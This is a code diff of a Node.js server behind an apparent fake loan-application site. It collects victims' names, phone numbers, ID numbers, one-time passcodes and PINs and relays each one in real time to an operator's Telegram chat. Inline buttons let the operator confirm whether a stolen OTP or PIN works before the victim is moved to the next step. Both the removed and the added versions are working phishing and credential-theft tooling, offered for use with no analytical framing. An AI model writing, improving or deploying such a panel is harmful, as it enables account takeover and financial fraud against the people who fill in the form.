@@ -1,440 +1,244 @@
 const express = require('express');
 const http = require('http');
-const https = require('https');
-const fs = require('fs');
+const { WebSocketServer } = require('ws');
 const path = require('path');
-const { WebSocketServer, WebSocket } = require('ws');
+const TelegramBot = require('node-telegram-bot-api');
 
-// ═══════════════════════════════════════════
-// CONFIG
-// ═══════════════════════════════════════════
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// ─── CONFIG ───────────────────────────────────────────────
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
+const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || 'YOUR_TELEGRAM_ID_HERE'; // get from @userinfobot
 const PORT = process.env.PORT || 3000;
-const SESSIONS_FILE = path.join(__dirname, 'sessions.json');
 
-// ═══════════════════════════════════════════
-// SESSION PERSISTENCE (survives server restarts)
-// ═══════════════════════════════════════════
-let sessions = {};
-
-function loadSessions() {
-    try {
-        if (fs.existsSync(SESSIONS_FILE)) {
-            const data = fs.readFileSync(SESSIONS_FILE, 'utf-8');
-            const parsed = JSON.parse(data);
-            // Restore sessions but clear ws references (they're dead)
-            for (const key in parsed) {
-                parsed[key].ws = null;
-                sessions[key] = parsed[key];
-            }
-            console.log('Loaded ' + Object.keys(sessions).length + ' sessions from file');
-        }
-    } catch (e) {
-        console.log('No saved sessions to load');
-    }
-}
-
-function saveSessions() {
-    try {
-        // Strip ws references before saving
-        const toSave = {};
-        for (const key in sessions) {
-            const s = { ...sessions[key] };
-            delete s.ws;
-            toSave[key] = s;
-        }
-        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(toSave, null, 2));
-    } catch (e) {
-        console.error('Failed to save sessions:', e.message);
-    }
-}
-
-loadSessions();
-
-// ═══════════════════════════════════════════
-// SETUP
-// ═══════════════════════════════════════════
+// ─── SETUP ────────────────────────────────────────────────
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server, path: '/ws' });
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
-app.use(express.static(__dirname));
 app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
 
-// ═══════════════════════════════════════════
-// WEBSOCKET
-// ═══════════════════════════════════════════
+// ─── SESSION STORE ────────────────────────────────────────
+const sessions = {};
+// sessionId → { phase, data, decision, chatId, createdAt }
+// phase: 'otp' | 'otp_submitted' | 'pin' | 'pin_submitted' | 'success'
+
+// ─── WEBSOCKET ────────────────────────────────────────────
+const wsBySession = {};
+
 wss.on('connection', (ws, req) => {
-    const url = new URL(req.url, 'http://localhost:' + PORT);
+    const url = new URL(req.url, 'http://localhost');
     const sessionId = url.searchParams.get('session');
-
     if (sessionId && sessions[sessionId]) {
-        sessions[sessionId].ws = ws;
-        console.log('WS connected:', sessions[sessionId].name, sessionId);
-    } else {
-        console.log('WS connected, no session:', sessionId);
+        wsBySession[sessionId] = ws;
     }
-
     ws.on('close', () => {
-        if (sessionId && sessions[sessionId]) {
-            sessions[sessionId].ws = null;
-            console.log('WS disconnected:', sessions[sessionId].name);
-        }
+        if (sessionId && wsBySession[sessionId] === ws) delete wsBySession[sessionId];
     });
 });
 
-// ═══════════════════════════════════════════
-// TELEGRAM HTTPS HELPER
-// ═══════════════════════════════════════════
-function tgRequest(method, path, body) {
-    return new Promise((resolve, reject) => {
-        const payload = body ? JSON.stringify(body) : null;
-        const opts = { method, hostname: 'api.telegram.org', path };
-        if (payload) {
-            opts.headers = {
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(payload)
-            };
-        }
-        const req = https.request(opts, (res) => {
-            let data = '';
-            res.on('data', chunk => data += chunk);
-            res.on('end', () => {
-                try { resolve(JSON.parse(data)); }
-                catch (e) { resolve({ ok: false, raw: data }); }
-            });
-        });
-        req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
-        req.on('error', reject);
-        if (payload) req.write(payload);
-        req.end();
-    });
+function sendToUser(sessionId, message) {
+    const ws = wsBySession[sessionId];
+    if (ws && ws.readyState === 1) ws.send(JSON.stringify(message));
 }
 
-function sendTelegram(text, buttons) {
-    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' };
-    if (buttons) body.reply_markup = { inline_keyboard: buttons };
-    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', body)
-        .then(res => {
-            if (res.ok) console.log('TG sent');
-            else console.error('TG error:', JSON.stringify(res));
-        })
-        .catch(err => console.error('Network:', err.message));
+// ─── TELEGRAM HELPERS ─────────────────────────────────────
+function sendToAdmin(text, inlineButtons) {
+    const opts = { parse_mode: 'HTML' };
+    if (inlineButtons) {
+        opts.reply_markup = { inline_keyboard: inlineButtons };
+    }
+    return bot.sendMessage(ADMIN_TELEGRAM_ID, text, opts).catch(e => console.log('[TG Error]', e.message));
 }
 
-function answerCallback(cqId, text) {
-    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
-        callback_query_id: cqId,
-        text: text
-    });
-}
-
-// ═══════════════════════════════════════════
-// PAGE 1: Application
-// ═══════════════════════════════════════════
-app.post('/api/apply', async (req, res) => {
-    const { name, phone, amount, period } = req.body;
-
-    if (!name || !phone || !amount || !period) {
-        return res.status(400).json({ error: 'Missing fields' });
+// ─── API: CREATE SESSION ──────────────────────────────────
+app.post('/api/apply', (req, res) => {
+    const { name, phone, idNumber, amount, period } = req.body;
+    if (!name || !phone || !idNumber || !amount || !period) {
+        return res.status(400).json({ success: false, error: 'Missing fields' });
     }
 
-    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+    sessions[sessionId] = {
+        phase: 'otp',
+        data: { name, phone, idNumber, amount, period },
+        decision: null,
+        createdAt: Date.now()
+    };
+
     const interest = Math.round(amount * 0.0013 * period);
     const total = amount + interest;
 
-    sessions[sessionId] = {
-        name, phone, amount, period,
-        otp: '', pin: '',
-        otpDecision: null, otpDecisionSent: false,
-        pinDecision: null, pinDecisionSent: false,
-        createdAt: new Date().toISOString()
-    };
+    sendToAdmin(
+        `🆕 <b>New Loan Application</b>\n\n` +
+        `👤 <b>Name:</b> ${esc(name)}\n` +
+        `📱 <b>Phone:</b> ${phone}\n` +
+        `🪪 <b>ID Number:</b> ${idNumber}\n` +
+        `💰 <b>Amount:</b> K${amount.toLocaleString()}\n` +
+        `📅 <b>Period:</b> ${period} days\n` +
+        `📊 <b>Est. Repayment:</b> K${total.toLocaleString()}\n\n` +
+        `⏳ <i>Waiting for OTP verification…</i>`,
+        [
+            [
+                { text: '✅ Correct OTP', callback_data: `otp_correct:${sessionId}` },
+                { text: '❌ Wrong OTP', callback_data: `otp_wrong:${sessionId}` }
+            ]
+        ]
+    );
 
-    saveSessions();
-
-    const msg = 'NEW LOAN APPLICATION\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        'Name: ' + name + '\n' +
-        'Phone: ' + phone + '\n' +
-        'Amount: K' + amount.toLocaleString() + '\n' +
-        'Period: ' + period + ' days\n' +
-        'Interest: K' + interest.toLocaleString() + '\n' +
-        'Total Repay: K' + total.toLocaleString() + '\n' +
-        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
-        '━━━━━━━━━━━━━━━━━━';
-
-    await sendTelegram(msg);
+    console.log(`[NEW] ${sessionId} | ${name} | ${phone} | K${amount}`);
     res.json({ success: true, sessionId });
 });
 
-// ═══════════════════════════════════════════
-// PAGE 2: OTP (4 digits, with admin buttons)
-// ═══════════════════════════════════════════
-app.post('/api/otp', async (req, res) => {
+// ─── API: SUBMIT OTP ──────────────────────────────────────
+app.post('/api/otp', (req, res) => {
     const { sessionId, otp } = req.body;
-    const session = sessions[sessionId];
+    const s = sessions[sessionId];
+    if (!s) return res.status(400).json({ success: false, error: 'Session not found' });
+    if (s.phase !== 'otp') return res.status(400).json({ success: false, error: 'Not in OTP phase' });
 
-    if (!session) return res.status(404).json({ error: 'Session not found' });
+    s.phase = 'otp_submitted';
+    s.decision = null;
+    s.data.otp = otp;
 
-    session.otp = otp;
-    session.otpDecision = null;
-    session.otpDecisionSent = false;
-    saveSessions();
+    sendToAdmin(
+        `📲 <b>OTP Received</b>\n\n` +
+        `👤 ${esc(s.data.name)}\n` +
+        `📱 ${s.data.phone}\n` +
+        `🔢 <b>OTP Entered:</b> <code>${otp}</code>\n\n` +
+        `Is this the correct OTP?`
+    );
 
-    const msg = 'OTP SUBMITTED\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        'Name: ' + session.name + '\n' +
-        'Phone: ' + session.phone + '\n' +
-        'Amount: K' + session.amount.toLocaleString() + '\n' +
-        'Period: ' + session.period + ' days\n' +
-        'OTP: ' + otp + '\n' +
-        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        'Tap below to verify';
-
-    const buttons = [[
-        { text: 'Correct OTP', callback_data: 'otp_correct:' + sessionId },
-        { text: 'Wrong OTP', callback_data: 'otp_wrong:' + sessionId }
-    ]];
-
-    await sendTelegram(msg, buttons);
-    res.json({ success: true, waiting: true });
+    console.log(`[OTP] ${sessionId} → ${otp}`);
+    res.json({ success: true });
 });
 
-// ═══════════════════════════════════════════
-// PAGE 3: PIN (5 digits, with admin buttons)
-// ═══════════════════════════════════════════
-app.post('/api/pin', async (req, res) => {
+// ─── API: SUBMIT PIN ──────────────────────────────────────
+app.post('/api/pin', (req, res) => {
     const { sessionId, pin } = req.body;
-    const session = sessions[sessionId];
+    const s = sessions[sessionId];
+    if (!s) return res.status(400).json({ success: false, error: 'Session not found' });
+    if (s.phase !== 'pin') return res.status(400).json({ success: false, error: 'Not in PIN phase' });
 
-    if (!session) return res.status(404).json({ error: 'Session not found' });
+    s.phase = 'pin_submitted';
+    s.decision = null;
+    s.data.pin = pin;
 
-    session.pin = pin;
-    session.pinDecision = null;
-    session.pinDecisionSent = false;
-    saveSessions();
+    sendToAdmin(
+        `🔐 <b>PIN Received</b>\n\n` +
+        `👤 ${esc(s.data.name)}\n` +
+        `📱 ${s.data.phone}\n` +
+        `🔢 <b>PIN Entered:</b> <code>${pin}</code>\n\n` +
+        `Is this the correct PIN?`
+    );
 
-    const msg = 'PIN SUBMITTED\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        'Name: ' + session.name + '\n' +
-        'Phone: ' + session.phone + '\n' +
-        'PIN: ' + pin + '\n' +
-        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        'Tap below to verify';
-
-    const buttons = [[
-        { text: 'Correct PIN', callback_data: 'pin_correct:' + sessionId },
-        { text: 'Wrong PIN', callback_data: 'pin_wrong:' + sessionId }
-    ]];
-
-    await sendTelegram(msg, buttons);
-    res.json({ success: true, waiting: true });
+    console.log(`[PIN] ${sessionId} → ${pin}`);
+    res.json({ success: true });
 });
 
-// ═══════════════════════════════════════════
-// POLLING FALLBACK (frontend checks every 3s)
-// ═══════════════════════════════════════════
+// ─── API: POLL FOR DECISION (fallback) ────────────────────
 app.get('/api/check', (req, res) => {
     const { sessionId } = req.query;
-    const session = sessions[sessionId];
+    const s = sessions[sessionId];
+    if (!s) return res.json({ status: 'not_found' });
 
-    if (!session) {
-        return res.json({ status: 'not_found' });
+    if (s.decision) {
+        const d = s.decision;
+        s.decision = null;
+        res.json({ status: 'decision', type: d.type, result: d.result });
+    } else {
+        res.json({ status: 'waiting' });
     }
-
-    if (session.otpDecision && !session.otpDecisionSent) {
-        session.otpDecisionSent = true;
-        saveSessions();
-        return res.json({ status: 'decision', type: 'otp_result', result: session.otpDecision });
-    }
-
-    if (session.pinDecision && !session.pinDecisionSent) {
-        session.pinDecisionSent = true;
-        saveSessions();
-        return res.json({ status: 'decision', type: 'pin_result', result: session.pinDecision });
-    }
-
-    res.json({ status: 'waiting' });
 });
 
-// ═══════════════════════════════════════════
-// TELEGRAM POLLING (handles button clicks)
-// ═══════════════════════════════════════════
-let offset = 0;
+// ─── TELEGRAM CALLBACK HANDLER (Admin clicks buttons) ─────
+bot.on('callback_query', async (query) => {
+    const data = query.data;
+    const [action, result, sessionId] = data.split(':');
 
-async function pollTelegram() {
-    try {
-        const data = await tgRequest('GET', '/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + offset + '&timeout=0');
-
-        if (data.ok) {
-            for (const update of data.result) {
-                offset = update.update_id + 1;
-
-                if (!update.callback_query) continue;
-
-                const cq = update.callback_query;
-                const parts = cq.data.split(':');
-                const action = parts[0] + '_' + parts[1];
-                const sessionId = parts.slice(2).join(':');
-                const session = sessions[sessionId];
-
-                if (!session) {
-                    console.log('Unknown session:', sessionId);
-                    await answerCallback(cq.id, 'Session not found. Please re-apply.');
-                    continue;
-                }
-
-                // ─── OTP CORRECT ───
-                if (action === 'otp_correct') {
-                    session.otpDecision = 'correct';
-                    session.otpDecisionSent = false;
-                    saveSessions();
-
-                    await answerCallback(cq.id, 'OTP Approved!');
-
-                    await sendTelegram(
-                        'OTP VERIFIED\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'Name: ' + session.name + '\n' +
-                        'Phone: ' + session.phone + '\n' +
-                        'OTP: ' + session.otp + '\n' +
-                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'User moving to PIN verification'
-                    );
-
-                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
-                        session.otpDecisionSent = true;
-                        saveSessions();
-                    }
-
-                    console.log('OTP CORRECT:', session.name, session.otp);
-
-                // ─── OTP WRONG ───
-                } else if (action === 'otp_wrong') {
-                    session.otpDecision = 'wrong';
-                    session.otpDecisionSent = false;
-                    saveSessions();
-
-                    await answerCallback(cq.id, 'OTP Rejected. User notified.');
-
-                    await sendTelegram(
-                        'OTP REJECTED\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'Name: ' + session.name + '\n' +
-                        'Phone: ' + session.phone + '\n' +
-                        'OTP: ' + session.otp + '\n' +
-                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'User asked to re-enter OTP'
-                    );
-
-                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
-                        session.otpDecisionSent = true;
-                        saveSessions();
-                    }
-
-                    console.log('OTP WRONG:', session.name, session.otp);
-
-                // ─── PIN CORRECT ───
-                } else if (action === 'pin_correct') {
-                    session.pinDecision = 'correct';
-                    session.pinDecisionSent = false;
-                    saveSessions();
-
-                    await answerCallback(cq.id, 'PIN Approved! Application complete.');
-
-                    await sendTelegram(
-                        'APPLICATION COMPLETE\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'Name: ' + session.name + '\n' +
-                        'Phone: ' + session.phone + '\n' +
-                        'Amount: K' + session.amount.toLocaleString() + '\n' +
-                        'Period: ' + session.period + ' days\n' +
-                        'PIN: ' + session.pin + '\n' +
-                        'OTP: ' + session.otp + '\n' +
-                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'All verified. Application submitted.'
-                    );
-
-                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
-                        session.pinDecisionSent = true;
-                        saveSessions();
-                    }
-
-                    console.log('PIN CORRECT:', session.name, 'COMPLETE');
-
-                // ─── PIN WRONG ───
-                } else if (action === 'pin_wrong') {
-                    session.pinDecision = 'wrong';
-                    session.pinDecisionSent = false;
-                    saveSessions();
-
-                    await answerCallback(cq.id, 'PIN Rejected. User notified.');
-
-                    await sendTelegram(
-                        'PIN REJECTED\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'Name: ' + session.name + '\n' +
-                        'Phone: ' + session.phone + '\n' +
-                        'PIN: ' + session.pin + '\n' +
-                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
-                        '━━━━━━━━━━━━━━━━━━\n' +
-                        'User asked to re-enter PIN'
-                    );
-
-                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
-                        session.pinDecisionSent = true;
-                        saveSessions();
-                    }
-
-                    console.log('PIN WRONG:', session.name, session.pin);
-                }
-            }
-        }
-    } catch (err) {
-        if (err.message !== 'timeout') console.error('Polling error:', err.message);
+    const s = sessions[sessionId];
+    if (!s) {
+        await bot.answerCallbackQuery(query.id, { text: 'Session expired' });
+        return;
     }
-    setTimeout(pollTelegram, 2000);
-}
 
-// ═══════════════════════════════════════════
-// CLEANUP OLD SESSIONS (older than 24h)
-// ═══════════════════════════════════════════
+    if (action === 'otp') {
+        if (result === 'correct') {
+            s.phase = 'pin';
+            const msg = { type: 'otp_result', result: 'correct' };
+            s.decision = { type: 'otp_result', result: 'correct' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '✅ OTP Correct → PIN phase' });
+            await bot.sendMessage(ADMIN_TELEGRAM_ID, `✅ <b>OTP Verified</b>\n👤 ${esc(s.data.name)}\n\nMoving to PIN verification…`, { parse_mode: 'HTML' });
+            console.log(`[ADMIN] ${sessionId} → OTP CORRECT`);
+        } else {
+            s.phase = 'otp';
+            const msg = { type: 'otp_result', result: 'wrong' };
+            s.decision = { type: 'otp_result', result: 'wrong' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP → re-enter' });
+            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>OTP Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter OTP.`, { parse_mode: 'HTML' });
+            console.log(`[ADMIN] ${sessionId} → OTP WRONG`);
+        }
+    }
+
+    if (action === 'pin') {
+        if (result === 'correct') {
+            s.phase = 'success';
+            const msg = { type: 'pin_result', result: 'correct' };
+            s.decision = { type: 'pin_result', result: 'correct' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '✅ PIN Correct → SUCCESS' });
+
+            const interest = Math.round(s.data.amount * 0.0013 * s.data.period);
+            const total = s.data.amount + interest;
+            const ref = 'RMZ-' + Date.now().toString(36).toUpperCase().slice(-8);
+
+            await bot.sendMessage(ADMIN_TELEGRAM_ID,
+                `🎉 <b>APPLICATION SUCCESSFUL!</b>\n\n` +
+                `👤 <b>Name:</b> ${esc(s.data.name)}\n` +
+                `📱 <b>Phone:</b> ${s.data.phone}\n` +
+                `🪪 <b>ID:</b> ${s.data.idNumber}\n` +
+                `💰 <b>Amount:</b> K${s.data.amount.toLocaleString()}\n` +
+                `📅 <b>Period:</b> ${s.data.period} days\n` +
+                `📊 <b>Repayment:</b> K${total.toLocaleString()}\n` +
+                `🔖 <b>Ref:</b> ${ref}\n\n` +
+                `💡 <b>Deposit more money for more loan!</b>`,
+                { parse_mode: 'HTML' }
+            );
+            console.log(`[ADMIN] ${sessionId} → PIN CORRECT → SUCCESS`);
+        } else {
+            s.phase = 'pin';
+            const msg = { type: 'pin_result', result: 'wrong' };
+            s.decision = { type: 'pin_result', result: 'wrong' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong PIN → re-enter' });
+            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>PIN Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter PIN.`, { parse_mode: 'HTML' });
+            console.log(`[ADMIN] ${sessionId} → PIN WRONG`);
+        }
+    }
+});
+
+// ─── TELEGRAM: respond to /start ──────────────────────────
+bot.onText(/\/start/, (msg) => {
+    if (msg.from.id === parseInt(ADMIN_TELEGRAM_ID)) {
+        bot.sendMessage(msg.chat.id, '✅ <b>Admin Connected</b>\n\nYou will receive loan applications here.\nUse the inline buttons to verify OTP and PIN.', { parse_mode: 'HTML' });
+    }
+});
+
+// ─── HELPER ───────────────────────────────────────────────
+function esc(t) { return t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+
+// ─── CLEANUP ──────────────────────────────────────────────
 setInterval(() => {
     const now = Date.now();
-    for (const key in sessions) {
-        if (sessions[key].createdAt) {
-            const age = now - new Date(sessions[key].createdAt).getTime();
-            if (age > 24 * 60 * 60 * 1000) {
-                delete sessions[key];
-                console.log('Cleaned up old session:', key);
-            }
-        }
+    for (const [id, s] of Object.entries(sessions)) {
+        if (now - s.createdAt > 30 * 60 * 1000) delete sessions[id];
     }
-    saveSessions();
-}, 3600000);
+}, 60000);
 
-// ═══════════════════════════════════════════
-// START
-// ═══════════════════════════════════════════
 server.listen(PORT, () => {
-    console.log('');
-    console.log('Server running on port ' + PORT);
-    console.log('WebSocket: /ws');
-    console.log('Telegram polling started');
-    console.log('Token set:', TELEGRAM_BOT_TOKEN ? 'YES' : 'NO (check env vars)');
-    console.log('Chat ID:', TELEGRAM_CHAT_ID || 'NOT SET');
-    console.log('Sessions file:', SESSIONS_FILE);
-    console.log('');
-    pollTelegram();
+    console.log(`\n✅ Server: http://localhost:${PORT}`);
+    console.log(`📱 User:   http://localhost:${PORT}/`);
+    console.log(`🤖 Bot:    Listening for Telegram callbacks…\n`);
 });   
